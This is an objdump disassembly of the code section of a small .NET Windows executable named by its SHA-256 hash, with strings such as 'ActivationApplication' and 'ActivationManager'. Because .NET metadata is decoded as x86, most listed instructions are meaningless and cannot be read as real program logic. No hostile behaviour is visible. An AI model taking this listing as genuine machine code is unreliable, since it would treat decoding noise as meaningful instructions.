
d76eb2510b4bbf54ceb93ff113fd6ee98cc04874fcea256105d0a2fd33834f4e.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	and    BYTE PTR ds:0x0,dh
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x225400,al
  402013:	add    BYTE PTR [eax+0x11],bl
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    DWORD PTR [eax],eax
  40201e:	add    BYTE PTR [esi],al
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [edi+0x33fef446],ch
  402055:	mov    gs,esp
  402057:	xor    al,0xf
  402059:	pop    ds
  40205a:	cwde   
  40205b:	outs   dx,BYTE PTR ds:[esi]
  40205c:	pusha  
  40205d:	nop
  40205e:	inc    eax
  40205f:	ja     0x4020d4
  402061:	jp     0x4020ce
  402063:	es dec ebx
  402065:	mov    dh,0x83
  402067:	pop    ebx
  402068:	imul   ebp,DWORD PTR [ecx+0x33d023c3],0xffffffad
  40206f:	mov    ch,0xd4
  402071:	push   0xb0d77aa7
  402076:	sbb    ebp,ebp
  402078:	mov    DWORD PTR [eax-0x39686629],esi
  40207e:	adc    DWORD PTR [ecx-0x1c],ecx
  402081:	xchg   esp,eax
  402083:	fidivr DWORD PTR [ecx+0x59]
  402086:	add    DWORD PTR [ecx-0x51],0x30483f67
  40208d:	pushf  
  40208e:	mov    ah,0xd3
  402090:	jns    0x402026
  402092:	mov    bh,BYTE PTR [esi+0xc64de4a]
  402098:	sbb    esi,edi
  40209a:	dec    edi
  40209b:	test   al,0x38
  40209d:	outs   dx,DWORD PTR ds:[esi]
  40209e:	fsubr  QWORD PTR [ebp-0x6a04b5f8]
  4020a4:	jns    0x402046
  4020a6:	jle    0x40208c
  4020a8:	lods   al,BYTE PTR ds:[esi]
  4020a9:	mov    ah,bl
  4020ab:	push   es
  4020ac:	xchg   ecx,eax
  4020ad:	pop    esp
  4020ae:	int    0xd4
  4020b0:	sbb    eax,0x23324e6
  4020b5:	jle    0x402120
  4020b7:	test   DWORD PTR [edx+0x6a591af5],ebp
  4020bd:	bound  ebx,QWORD PTR [ebx+0x63]
  4020c0:	sti    
  4020c1:	cwde   
  4020c2:	xlat   BYTE PTR es:[ebx]
  4020c4:	or     al,cl
  4020c6:	push   ss
  4020c7:	jne    0x402117
  4020c9:	sar    al,1
  4020cb:	sub    edx,ebp
  4020cd:	ins    BYTE PTR es:[di],dx
  4020cf:	and    BYTE PTR [ecx-0x4ca774cc],ch
  4020d5:	sahf   
  4020d6:	add    ecx,DWORD PTR [ecx+0x7b]
  4020d9:	(bad)  
  4020da:	push   ebx
  4020db:	push   0xffffffab
  4020dd:	data16 repz cli 
  4020e0:	nop
  4020e1:	mov    ch,BYTE PTR [ecx-0x13]
  4020e4:	rcr    DWORD PTR [edi+ecx*1],cl
  4020e7:	and    ecx,DWORD PTR [ebx]
  4020e9:	scas   eax,DWORD PTR es:[edi]
  4020ea:	adc    edx,DWORD PTR [edi+ebp*1-0x45]
  4020ee:	pmaxsw mm5,mm6
  4020f1:	push   eax
  4020f2:	mov    esi,0xc4caab3f
  4020f7:	xor    eax,0x53f4bbcf
  4020fc:	(bad)  
  4020fd:	push   eax
  4020fe:	sbb    ch,BYTE PTR [eax]
  402100:	imul   ecx,DWORD PTR [esi],0xf
  402103:	das    
  402104:	stc    
  402105:	gs mov al,0xfc
  402108:	retf   0xf5da
  40210b:	push   0xffffffea
  40210d:	push   esi
  40210e:	mov    bl,0xa0
  402110:	enter  0x4226,0xa2
  402114:	jae    0x4020d3
  402116:	dec    edi
  402117:	enter  0x17d3,0x38
  40211b:	adc    edi,edi
  40211d:	jae    0x4020cc
  40211f:	mov    WORD PTR [edx],?
  402121:	ror    BYTE PTR [ebx+eiz*2+0x50],0xcc
  402126:	xor    dh,BYTE PTR [ebx-0x42cb02ad]
  40212c:	cmp    DWORD PTR [edi],0x1b00189f
  402132:	inc    edx
  402133:	adc    DWORD PTR [edi+0x66c33466],edi
  402139:	rol    BYTE PTR [ecx],1
  40213b:	sub    esi,ecx
  40213d:	loope  0x4020d3
  40213f:	out    0xf4,eax
  402141:	dec    ecx
  402142:	imul   ecx,esp,0x4d8be105
  402148:	or     ah,0x6e
  40214b:	mov    dl,BYTE PTR [esi+ebp*2+0x1d]
  40214f:	xchg   esi,eax
  402150:	sbb    esi,DWORD PTR [eax]
  402152:	add    eax,0x9500
  402157:	add    BYTE PTR [ecx],al
  402159:	add    BYTE PTR [eax],al
  40215b:	adc    DWORD PTR [edx+0x1],esi
  40215e:	add    BYTE PTR [eax],al
  402160:	jo     0x40218a
  402162:	sbb    BYTE PTR [eax],al
  402164:	add    BYTE PTR [edx],cl
  402166:	or     al,BYTE PTR [esi]
  402168:	sub    BYTE PTR [ecx],bl
  40216a:	add    BYTE PTR [eax],al
  40216c:	or     ch,BYTE PTR ds:0x1a280616
  402172:	add    BYTE PTR [eax],al
  402174:	or     ch,BYTE PTR [eax]
  402176:	sbb    eax,DWORD PTR [eax]
  402178:	add    BYTE PTR [edx],cl
  40217a:	and    al,ch
  40217c:	add    eax,DWORD PTR [eax]
  40217e:	add    BYTE PTR [edx+0x28],bl
  402181:	sbb    al,0x0
  402183:	add    BYTE PTR [edx],cl
  402185:	adc    eax,0x698e020b
  40218a:	pop    ss
  40218b:	cs pop es
  40218d:	adc    eax,0x1d28
  402192:	or     ch,BYTE PTR [edx]
  402194:	add    dl,BYTE PTR [esi]
  402196:	call   0x600:0x5730c
  40219d:	or     eax,0x37409
  4021a2:	add    BYTE PTR [edx],al
  4021a4:	adc    eax,DWORD PTR [ecx+edx*1]
  4021a7:	add    al,0x8
  4021a9:	adc    al,0x1c
  4021ab:	adc    al,BYTE PTR [ecx]
  4021ad:	outs   dx,DWORD PTR ds:[esi]
  4021ae:	add    al,0x0
  4021b0:	add    BYTE PTR [esi],al
  4021b2:	pop    es
  4021b3:	sub    BYTE PTR ds:0xde0a0000,bl
  4021b9:	adc    eax,DWORD PTR ss:0x2280511
  4021c0:	add    BYTE PTR [eax],al
  4021c2:	push   es
  4021c3:	adc    DWORD PTR ds:0x1e28,eax
  4021c9:	or     dl,BYTE PTR [ebx]
  4021cb:	push   es
  4021cc:	adc    DWORD PTR [esi],eax
  4021ce:	sub    BYTE PTR ds:0x110a0000,bl
  4021d4:	push   es
  4021d5:	push   ss
  4021d6:	xor    DWORD PTR [esi],edx
  4021d8:	adc    DWORD PTR [esi],eax
  4021da:	sub    BYTE PTR [edi],bl
  4021dc:	add    BYTE PTR [eax],al
  4021de:	or     ah,BYTE PTR [esi]
  4021e0:	adc    eax,0x1d28
  4021e5:	or     bl,dh
  4021e7:	push   es
  4021e8:	fiadd  WORD PTR es:[ebx]
  4021eb:	fiadd  WORD PTR es:[eax]
  4021ee:	fiadd  WORD PTR [eax]
  4021f0:	sub    al,BYTE PTR [eax]
  4021f2:	add    BYTE PTR [eax],al
  4021f4:	add    DWORD PTR [eax],ebp
  4021f6:	add    BYTE PTR [eax],al
  4021f8:	add    BYTE PTR [eax],al
  4021fa:	jl     0x4021fc
  4021fc:	adc    BYTE PTR [eax+eax*1+0x2503],cl
  402203:	add    DWORD PTR [eax],eax
  402205:	add    BYTE PTR [eax+eax*1+0x10],bh
  402209:	pop    DWORD PTR [eax]
  40220b:	add    esp,DWORD PTR [esi]
  40220d:	add    BYTE PTR [eax],al
  40220f:	add    DWORD PTR [eax],eax
  402211:	add    BYTE PTR [eax+eax*1],bh
  402214:	and    bl,BYTE PTR [esi+0x0]
  402217:	add    eax,DWORD PTR ss:[eax]
  40221a:	add    BYTE PTR [ecx],al
  40221c:	adc    esi,DWORD PTR [eax]
  40221e:	add    eax,0x2100
  402223:	add    BYTE PTR [edx],al
  402225:	add    BYTE PTR [eax],al
  402227:	adc    DWORD PTR [eax],ebp
  402229:	and    BYTE PTR [eax],al
  40222b:	add    BYTE PTR [edx],cl
  40222d:	jb     0x40225a
  40222f:	add    BYTE PTR [eax],al
  402231:	jo     0x40224a
  402233:	lea    eax,[ecx]
  402235:	add    BYTE PTR [eax],al
  402237:	add    DWORD PTR [edx],ecx
  402239:	push   es
  40223a:	push   ss
  40223b:	add    ah,BYTE PTR [edx+0x212806]
  402241:	add    BYTE PTR [edx],cl
  402243:	sub    BYTE PTR [edx],ah
  402245:	add    BYTE PTR [eax],al
  402247:	or     ch,BYTE PTR [edx]
  402249:	push   ds
  40224a:	add    ch,BYTE PTR [eax]
  40224c:	and    eax,DWORD PTR [eax]
  40224e:	add    BYTE PTR [edx],cl
  402250:	sub    al,BYTE PTR [eax]
  402252:	add    BYTE PTR [eax],al
  402254:	inc    edx
  402255:	push   ebx
  402256:	dec    edx
  402257:	inc    edx
  402258:	add    DWORD PTR [eax],eax
  40225a:	add    DWORD PTR [eax],eax
  40225c:	add    BYTE PTR [eax],al
  40225e:	add    BYTE PTR [eax],al
  402260:	or     al,0x0
  402262:	add    BYTE PTR [eax],al
  402264:	jbe    0x40229a
  402266:	xor    BYTE PTR cs:[esi],ch
  402269:	xor    esi,DWORD PTR [eax]
  40226b:	xor    esi,DWORD PTR [ecx]
  40226d:	cmp    DWORD PTR [eax],eax
  40226f:	add    BYTE PTR [eax],al
  402271:	add    BYTE PTR ds:0x6c00,al
  402277:	add    BYTE PTR [eax],cl
  402279:	add    al,0x0
  40227b:	add    BYTE PTR [ebx],ah
  40227d:	jle    0x40227f
  40227f:	add    BYTE PTR [esp+eax*1+0x0],dh
  402283:	add    ah,al
  402285:	add    eax,0x53230000
  40228a:	je     0x4022fe
  40228c:	imul   ebp,DWORD PTR [esi+0x67],0x73
  402293:	add    BYTE PTR [eax],bh
  402295:	or     al,BYTE PTR [eax]
  402297:	add    BYTE PTR [eax+eax*1+0x55230000],dh
  40229e:	push   ebx
  40229f:	add    ah,ch
  4022a1:	or     al,BYTE PTR [eax]
  4022a3:	add    BYTE PTR [eax],dl
  4022a5:	add    BYTE PTR [eax],al
  4022a7:	add    BYTE PTR [ebx],ah
  4022a9:	inc    edi
  4022aa:	push   ebp
  4022ab:	dec    ecx
  4022ac:	inc    esp
  4022ad:	add    BYTE PTR [eax],al
  4022af:	add    ah,bh
  4022b1:	or     al,BYTE PTR [eax]
  4022b3:	add    BYTE PTR [esi+eax*1+0x0],bl
  4022b7:	add    BYTE PTR [ebx],ah
  4022b9:	inc    edx
  4022ba:	ins    BYTE PTR es:[edi],dx
  4022bb:	outs   dx,DWORD PTR ds:[esi]
  4022bc:	bound  eax,QWORD PTR [eax]
  4022be:	add    BYTE PTR [eax],al
  4022c0:	add    BYTE PTR [eax],al
  4022c2:	add    BYTE PTR [eax],al
  4022c4:	add    al,BYTE PTR [eax]
  4022c6:	add    BYTE PTR [ecx],al
  4022c8:	push   edi
  4022c9:	cmp    eax,0x90002
  4022ce:	add    BYTE PTR [eax],al
  4022d0:	add    dl,bh
  4022d2:	and    eax,0x160033
  4022d7:	add    BYTE PTR [ecx],al
  4022d9:	add    BYTE PTR [eax],al
  4022db:	add    BYTE PTR [eax+eax*1],ch
  4022de:	add    BYTE PTR [eax],al
  4022e0:	add    eax,0x5000000
  4022e5:	add    BYTE PTR [eax],al
  4022e7:	add    BYTE PTR ds:0x6000000,al
  4022ed:	add    BYTE PTR [eax],al
  4022ef:	add    BYTE PTR [edi],ah
  4022f1:	add    BYTE PTR [eax],al
  4022f3:	add    BYTE PTR [eax+eax*1],al
  4022f6:	add    BYTE PTR [eax],al
  4022f8:	pop    ss
  4022f9:	add    BYTE PTR [eax],al
  4022fb:	add    BYTE PTR [ebx],al
  4022fd:	add    BYTE PTR [eax],al
  4022ff:	add    BYTE PTR [edx],al
  402301:	add    BYTE PTR [eax],al
  402303:	add    BYTE PTR [ecx],al
  402305:	add    BYTE PTR [eax],al
  402307:	add    BYTE PTR [edx],al
  402309:	add    BYTE PTR [eax],al
  40230b:	add    BYTE PTR [eax],al
  40230d:	add    BYTE PTR [edx],cl
  40230f:	add    BYTE PTR [ecx],al
  402311:	add    BYTE PTR [eax],al
  402313:	add    BYTE PTR [eax],al
  402315:	add    BYTE PTR [esi],al
  402317:	add    BYTE PTR [ecx+0x6009200],bl
  40231d:	add    BYTE PTR [eax+0x6009200],ah
  402323:	add    BYTE PTR [edx+0x6009200],ch
  402329:	add    BYTE PTR [edx],ch
  40232b:	add    DWORD PTR [ebx],ecx
  40232d:	add    DWORD PTR [esi],eax
  40232f:	add    BYTE PTR ds:0x6010b01,bh
  402335:	add    BYTE PTR [ebx+0x1],cl
  402338:	or     eax,DWORD PTR [ecx]
  40233a:	push   es
  40233b:	add    BYTE PTR [ebx+0x1],bh
  40233e:	or     eax,DWORD PTR [ecx]
  402340:	push   es
  402341:	add    BYTE PTR [edx+0x6018801],ah
  402347:	add    BYTE PTR [ebx+0x6010b01],bh
  40234d:	add    bh,cl
  40234f:	add    DWORD PTR [edx-0x8fffa00],edx
  402355:	add    ebp,esp
  402357:	add    DWORD PTR [esi],eax
  402359:	add    BYTE PTR [esi],cl
  40235b:	add    ah,ch
  40235d:	add    DWORD PTR [esi],eax
  40235f:	add    BYTE PTR [ebx],ch
  402361:	add    ah,ch
  402363:	add    DWORD PTR [esi],eax
  402365:	add    BYTE PTR [ecx+0x2],cl
  402368:	in     eax,0x1
  40236a:	push   es
  40236b:	add    BYTE PTR [edx+0x2],ah
  40236e:	in     eax,0x1
  402370:	push   es
  402371:	add    BYTE PTR [ebx+0x2],bh
  402374:	in     eax,0x1
  402376:	push   es
  402377:	add    BYTE PTR [esi+0x601e502],dl
  40237d:	add    BYTE PTR [edi+0x601e502],ch
  402383:	add    ah,cl
  402385:	add    ah,ch
  402387:	add    DWORD PTR [esi],eax
  402389:	add    BYTE PTR [ebx],al
  40238b:	add    esi,edx
  40238d:	add    al,BYTE PTR [esi]
  40238f:	add    BYTE PTR ds:0x602f203,ah
  402395:	add    BYTE PTR [edi+0x3],al
  402398:	in     eax,0x1
  40239a:	push   es
  40239b:	add    BYTE PTR [edx+0x3],ah
  40239e:	in     eax,0x1
  4023a0:	push   es
  4023a1:	add    BYTE PTR [ebx+0x3],bh
  4023a4:	in     eax,0x1
  4023a6:	push   es
  4023a7:	add    BYTE PTR [ecx+0x6039903],bh
  4023ad:	add    dl,ch
  4023af:	add    edx,edi
  4023b1:	add    ebp,DWORD PTR [ebx+0x0]
  4023b4:	inc    BYTE PTR [ebx]
  4023b6:	add    BYTE PTR [eax],al
  4023b8:	push   es
  4023b9:	add    BYTE PTR ds:0x6039904,cl
  4023bf:	add    BYTE PTR ds:0x6009204,ch
  4023c5:	add    BYTE PTR [eax+0x4],dl
  4023c8:	xchg   edx,eax
  4023c9:	add    BYTE PTR [esi],al
  4023cb:	add    BYTE PTR [edx+0x4],bh
  4023ce:	gs add al,0x6
  4023d1:	add    BYTE PTR [ecx+0x6009204],bl
  4023d7:	add    BYTE PTR [edi+0x6009204],bl
  4023dd:	add    dh,al
  4023df:	add    al,0xb5
  4023e1:	add    al,0x6
  4023e3:	add    al,ah
  4023e5:	add    al,0xb
  4023e7:	add    DWORD PTR [edx],ecx
  4023e9:	add    dl,bh
  4023eb:	add    al,0xd7
  4023ed:	add    eax,DWORD PTR [esi]
  4023ef:	add    BYTE PTR [ecx],dl
  4023f1:	add    eax,0x60092
  4023f6:	and    eax,DWORD PTR ds:0xa0092
  4023fc:	pop    ecx
  4023fd:	add    eax,0x603d7
  402402:	imul   eax,DWORD PTR ds:0x6010b,0x10b057c
  40240c:	push   es
  40240d:	add    BYTE PTR [ebx+0x6010b05],dl
  402413:	add    BYTE PTR [ebp+eax*1+0x6010b],ah
  40241a:	mov    dl,0x5
  40241c:	xchg   edx,eax
  40241d:	add    BYTE PTR [eax],al
  40241f:	add    BYTE PTR [eax],al
  402421:	add    BYTE PTR [ecx],al
  402423:	add    BYTE PTR [eax],al
  402425:	add    BYTE PTR [eax],al
  402427:	add    BYTE PTR [ecx],al
  402429:	add    BYTE PTR [ecx],al
  40242b:	add    BYTE PTR [eax],al
  40242d:	add    BYTE PTR [eax],dl
  40242f:	add    BYTE PTR [edx],ah
  402431:	add    BYTE PTR [edx],ch
  402433:	add    BYTE PTR ds:0x1000100,al
  402439:	add    BYTE PTR [ecx+0x3e000010],ah
  40243f:	add    BYTE PTR [edx],ch
  402441:	add    BYTE PTR [eax],al
  402443:	add    BYTE PTR [ecx],al
  402445:	add    BYTE PTR [eax+eax*1],al
  402448:	add    DWORD PTR [eax],edx
  40244a:	adc    BYTE PTR [eax],al
  40244c:	pop    esp
  40244d:	add    BYTE PTR [edx],ch
  40244f:	add    BYTE PTR ds:0x5000100,al
  402455:	add    BYTE PTR [ecx],al
  402457:	add    DWORD PTR [eax],eax
  402459:	add    BYTE PTR [ecx+0x0],bh
  40245c:	sub    al,BYTE PTR [eax]
  40245e:	or     DWORD PTR [eax],eax
  402460:	add    DWORD PTR [eax],eax
  402462:	push   es
  402463:	add    BYTE PTR [esi],al
  402465:	push   es
  402466:	ret    
  402467:	add    BYTE PTR [eax+eax*1],ah
  40246a:	push   esi
  40246b:	or     bl,0x0
  40246e:	daa    
  40246f:	add    BYTE PTR [esi-0x80],dl
  402472:	rol    BYTE PTR [eax],1
  402474:	daa    
  402475:	add    BYTE PTR [esi-0x80],dl
  402478:	fild   DWORD PTR [eax]
  40247a:	daa    
  40247b:	add    BYTE PTR [esi-0x80],dl
  40247e:	in     eax,0x0
  402480:	daa    
  402481:	add    BYTE PTR [eax+0x21],dl
  402484:	add    BYTE PTR [eax],al
  402486:	add    BYTE PTR [eax],al
  402488:	xchg   ecx,eax
  402489:	add    BYTE PTR [ebp+0x1000a00],ah
  40248f:	add    BYTE PTR [edx+eiz*1],bl
  402492:	add    BYTE PTR [eax],al
  402494:	add    BYTE PTR [eax],al
  402496:	xchg   ecx,eax
  402497:	add    BYTE PTR [eax+eax*1+0x20010],dh
  40249e:	dec    ecx
  40249f:	and    al,BYTE PTR [eax]
  4024a1:	add    BYTE PTR [eax],al
  4024a3:	add    BYTE PTR [esi+0x1600bd18],al
  4024a9:	add    BYTE PTR [ebx],al
  4024ab:	add    BYTE PTR [eax],al
  4024ad:	add    BYTE PTR [eax],al
  4024af:	add    BYTE PTR [eax],al
  4024b1:	add    dh,al
  4024b3:	add    eax,0x1a002a
  4024b8:	add    eax,DWORD PTR [eax]
  4024ba:	add    BYTE PTR [eax],al
  4024bc:	add    BYTE PTR [eax],al
  4024be:	add    edx,DWORD PTR [eax]
  4024c0:	xchg   BYTE PTR [eax],bl
  4024c2:	mov    ebp,0x7001600
  4024c7:	add    BYTE PTR [eax],al
  4024c9:	add    BYTE PTR [ecx],al
  4024cb:	add    ah,dh
  4024cd:	add    BYTE PTR [eax],al
  4024cf:	add    BYTE PTR [ecx],al
  4024d1:	add    cl,bh
  4024d3:	add    BYTE PTR [ecx],al
  4024d5:	and    BYTE PTR [ecx],al
  4024d7:	add    ah,bh
  4024d9:	add    BYTE PTR [ecx],al
  4024db:	and    BYTE PTR [edx],al
  4024dd:	add    BYTE PTR [edi+0x1],dl
  4024e0:	add    DWORD PTR [eax],esp
  4024e2:	add    eax,DWORD PTR [eax]
  4024e4:	imul   eax,DWORD PTR [ecx],0x40002
  4024ea:	jno    0x4024ed
  4024ec:	and    DWORD PTR [eax],eax
  4024ee:	mov    ebp,0x31003f00
  4024f3:	add    BYTE PTR [ebp+0x39001600],bh
  4024f9:	add    BYTE PTR [ebp+0x41001600],bh
  4024ff:	add    BYTE PTR [ebp+0x49004900],bh
  402505:	add    BYTE PTR [ebp+0x51004e00],bh
  40250b:	add    BYTE PTR [ebp+0x59004e00],bh
  402511:	add    BYTE PTR [ebp+0x61004900],bh
  402517:	add    BYTE PTR [ebp+0x69004900],bh
  40251d:	add    BYTE PTR [ebp+0x71004900],bh
  402523:	add    BYTE PTR [ebp+0x79004900],bh
  402529:	add    BYTE PTR [ebp-0x7effb700],bh
  40252f:	add    BYTE PTR [ebp-0x76ffb700],bh
  402535:	add    BYTE PTR [ebp-0x6effb700],bh
  40253b:	add    BYTE PTR [ebp-0x66ffb700],bh
  402541:	add    BYTE PTR [ebp-0x5effb700],bh
  402547:	add    BYTE PTR [ebp-0x56ffb700],bh
  40254d:	add    BYTE PTR [ebp-0x4effb700],bh
  402553:	add    BYTE PTR [ebp-0x46ffb200],bh
  402559:	add    BYTE PTR [ebp-0x3effb700],bh
  40255f:	add    BYTE PTR [ebp-0x36ffad00],bh
  402565:	add    BYTE PTR [ebp-0x2effea00],bh
  40256b:	add    BYTE PTR [ebp-0x1effa700],bh
  402571:	add    BYTE PTR [ebp-0x16ffa100],bh
  402577:	add    BYTE PTR [ecx],bh
  402579:	add    al,0x6
  40257b:	add    ecx,esi
  40257d:	add    BYTE PTR [edi+0x4],dl
  402580:	or     eax,DWORD PTR [ecx]
  402582:	stc    
  402583:	add    BYTE PTR [esi+0x1011004],al
  402589:	add    DWORD PTR [edi+0x11011504],ebp
  40258f:	add    ebp,ecx
  402591:	add    al,0x1d
  402593:	add    ecx,ebp
  402595:	add    bl,dl
  402597:	add    al,0x1d
  402599:	add    DWORD PTR [ecx],ebx
  40259b:	add    eax,ebp
  40259d:	add    al,0x22
  40259f:	add    DWORD PTR [ecx],esp
  4025a1:	add    DWORD PTR [edx],eax
  4025a3:	add    eax,0xf90128
  4025a8:	cmp    eax,0xf1011005
  4025ad:	add    BYTE PTR [edx+0x5],dl
  4025b0:	cmp    al,0x1
  4025b2:	cmp    DWORD PTR [ecx],eax
  4025b4:	pop    edi
  4025b5:	add    eax,0x90146
  4025ba:	mov    ebp,0x41001600
  4025bf:	add    DWORD PTR [ebp+0x49001600],edi
  4025c5:	add    DWORD PTR [ebp+0x59015000],edi
  4025cb:	add    DWORD PTR [ebp+0x61004900],edi
  4025d1:	add    DWORD PTR [ebp+0x8001600],edi
  4025d7:	add    BYTE PTR [eax],cl
  4025d9:	add    BYTE PTR [ebx],ch
  4025db:	add    BYTE PTR [eax],cl
  4025dd:	add    BYTE PTR [eax+eax*1],cl
  4025e0:	xor    BYTE PTR [eax],al
  4025e2:	or     BYTE PTR [eax],al
  4025e4:	adc    BYTE PTR [eax],al
  4025e6:	xor    eax,0x14000800
  4025eb:	add    BYTE PTR [edx],bh
  4025ed:	add    BYTE PTR [esi],ch
  4025ef:	add    BYTE PTR [ebx+0x0],bl
  4025f2:	xor    BYTE PTR [edx],al
  4025f4:	add    BYTE PTR cs:[ebx+0x2e065200],bh
  4025fb:	add    BYTE PTR [ebx],ah
  4025fd:	add    BYTE PTR [ecx+eax*1+0x2b002e],dh
  402604:	in     al,dx
  402605:	add    DWORD PTR [esi],ebp
  402607:	add    BYTE PTR [ebx],dh
  402609:	add    dl,dh
  40260b:	add    DWORD PTR [esi],ebp
  40260d:	add    BYTE PTR [ebx],bh
  40260f:	add    al,bh
  402611:	add    DWORD PTR [esi],ebp
  402613:	add    BYTE PTR [ebx+0x0],al
  402616:	clc    
  402617:	add    DWORD PTR [esi],ebp
  402619:	add    BYTE PTR [ebx+0x0],cl
  40261c:	clc    
  40261d:	add    DWORD PTR [esi],ebp
  40261f:	add    BYTE PTR [ebx+0x0],dl
  402622:	adc    eax,0x63002e02
  402627:	add    BYTE PTR [esi+0x2],dl
  40262a:	add    BYTE PTR cs:[ebx+0x0],dh
  40262e:	mov    al,BYTE PTR [edx]
  402630:	add    BYTE PTR cs:[ebx+0x0],bh
  402634:	mov    al,BYTE PTR [edx]
  402636:	add    BYTE PTR cs:[ebx+0x2e029c00],al
  40263d:	add    BYTE PTR [ebx+0x2e02aa00],cl
  402643:	add    BYTE PTR [ebx+0x2e01f200],dl
  402649:	add    BYTE PTR [ebx+0x2e02b500],bl
  40264f:	add    BYTE PTR [ebx+0x2e02e000],ah
  402655:	add    BYTE PTR [ebx+0x2e062a00],ch
  40265b:	add    BYTE PTR [ebx+0x63064900],dh
  402661:	add    BYTE PTR [ebx],dh
  402663:	add    DWORD PTR [eax+0x1],esp
  402666:	arpl   WORD PTR [eax],ax
  402668:	sub    eax,DWORD PTR [ecx]
  40266a:	push   edi
  40266b:	add    DWORD PTR [ebx-0x75fecd00],eax
  402671:	add    DWORD PTR [ebx+0x30013b00],esp
  402677:	add    BYTE PTR [edi],al
  402679:	add    BYTE PTR [ebp+0x0],al
  40267c:	or     DWORD PTR [eax],eax
  40267e:	inc    ebp
  40267f:	add    BYTE PTR [ebx],cl
  402681:	add    BYTE PTR [edi+0x0],al
  402684:	das    
  402685:	add    DWORD PTR [ebx+0x1],ecx
  402688:	add    al,0x80
  40268a:	add    BYTE PTR [eax],al
  40268c:	or     eax,DWORD PTR [eax]
  40268e:	add    BYTE PTR [eax],al
  402690:	add    BYTE PTR [eax],al
  402692:	add    BYTE PTR [eax],al
  402694:	add    DWORD PTR [eax],eax
  402696:	add    BYTE PTR [eax],al
  402698:	add    BYTE PTR fs:[edx],ch
  40269b:	add    BYTE PTR [eax],al
  40269d:	add    BYTE PTR [eax+eax*1],al
	...
  4026a8:	add    BYTE PTR [eax],al
  4026aa:	add    DWORD PTR [eax],eax
  4026ac:	mov    DWORD PTR [eax],eax
  4026ae:	add    BYTE PTR [eax],al
  4026b0:	add    BYTE PTR [eax],al
  4026b2:	add    al,0x0
	...
  4026bc:	add    BYTE PTR [eax],al
  4026be:	add    DWORD PTR [eax],eax
  4026c0:	xchg   edx,eax
	...
  4026c9:	cmp    al,0x4d
  4026cb:	outs   dx,DWORD PTR ds:[esi]
  4026cc:	fs jne 0x40273b
  4026cf:	gs add BYTE PTR ds:[ecx+0x63],al
  4026d4:	je     0x40273f
  4026d6:	jbe    0x402739
  4026d8:	je     0x40273f
  4026da:	inc    ecx
  4026db:	jo     0x40274d
  4026dd:	ins    BYTE PTR es:[edi],dx
  4026de:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4026e5:	cs gs js 0x40274e
  4026e9:	add    BYTE PTR [eax+0x72],dl
  4026ec:	outs   dx,DWORD PTR ds:[esi]
  4026ed:	addr16 jb 0x402751
  4026f0:	ins    DWORD PTR es:[edi],dx
  4026f1:	add    BYTE PTR [ecx+0x63],al
  4026f4:	je     0x40275f
  4026f6:	jbe    0x402759
  4026f8:	je     0x40275f
  4026fa:	inc    ecx
  4026fb:	jo     0x40276d
  4026fd:	ins    BYTE PTR es:[edi],dx
  4026fe:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  402705:	add    BYTE PTR [ecx+0x41],cl
  402708:	jo     0x40277a
  40270a:	ins    BYTE PTR es:[edi],dx
  40270b:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  402712:	inc    ecx
  402713:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  402717:	popa   
  402718:	je     0x402783
  40271a:	outs   dx,DWORD PTR ds:[esi]
  40271b:	outs   dx,BYTE PTR ds:[esi]
  40271c:	dec    ebp
  40271d:	popa   
  40271e:	outs   dx,BYTE PTR ds:[esi]
  40271f:	popa   
  402720:	addr16 gs jb 0x402724
  402724:	inc    ecx
  402725:	jo     0x402797
  402727:	ins    BYTE PTR es:[edi],dx
  402728:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40272f:	inc    ecx
  402730:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  402734:	popa   
  402735:	je     0x4027a0
  402737:	outs   dx,DWORD PTR ds:[esi]
  402738:	outs   dx,BYTE PTR ds:[esi]
  402739:	dec    ebp
  40273a:	popa   
  40273b:	outs   dx,BYTE PTR ds:[esi]
  40273c:	popa   
  40273d:	addr16 gs jb 0x402741
  402741:	inc    ecx
  402742:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  402746:	popa   
  402747:	je     0x4027ae
  402749:	dec    edi
  40274a:	jo     0x4027c0
  40274c:	imul   ebp,DWORD PTR [edi+0x6e],0x736d0073
  402753:	arpl   WORD PTR [edi+0x72],bp
  402756:	ins    BYTE PTR es:[edi],dx
  402757:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  40275e:	gs ins DWORD PTR es:[edi],dx
  402760:	add    BYTE PTR [edi+0x62],cl
  402763:	push   0x65
  402765:	arpl   WORD PTR [eax+eax*1+0x45],si
  402769:	outs   dx,BYTE PTR ds:[esi]
  40276a:	jne    0x4027d9
  40276c:	add    BYTE PTR [ebp+0x61],cl
  40276f:	imul   ebp,DWORD PTR [esi+0x0],0x65637845
  402776:	jo     0x4027ec
  402778:	imul   ebp,DWORD PTR [edi+0x6e],0x676f4c00
  40277f:	inc    ebp
  402780:	jb     0x4027f4
  402782:	outs   dx,DWORD PTR ds:[esi]
  402783:	jb     0x402785
  402785:	arpl   WORD PTR cs:[edi+ebp*2+0x72],si
  40278a:	add    BYTE PTR [esi+0x61],dh
  40278d:	ins    BYTE PTR es:[edi],dx
  40278e:	jne    0x4027f5
  402790:	pop    edi
  402791:	pop    edi
  402792:	add    BYTE PTR [esi+0x6f],cl
  402795:	outs   dx,BYTE PTR ds:[esi]
  402796:	add    BYTE PTR gs:[ebp+eiz*2+0x73],al
  40279b:	imul   esp,DWORD PTR [edi+0x6e],0x65646f4d
  4027a2:	add    BYTE PTR [esi+0x6f],cl
  4027a5:	inc    ebp
  4027a6:	jb     0x40281a
  4027a8:	outs   dx,DWORD PTR ds:[esi]
  4027a9:	jb     0x402800
  4027ab:	dec    ecx
  4027ac:	add    BYTE PTR [esi+0x6f],cl
  4027af:	push   ebx
  4027b0:	jo     0x40281e
  4027b2:	popa   
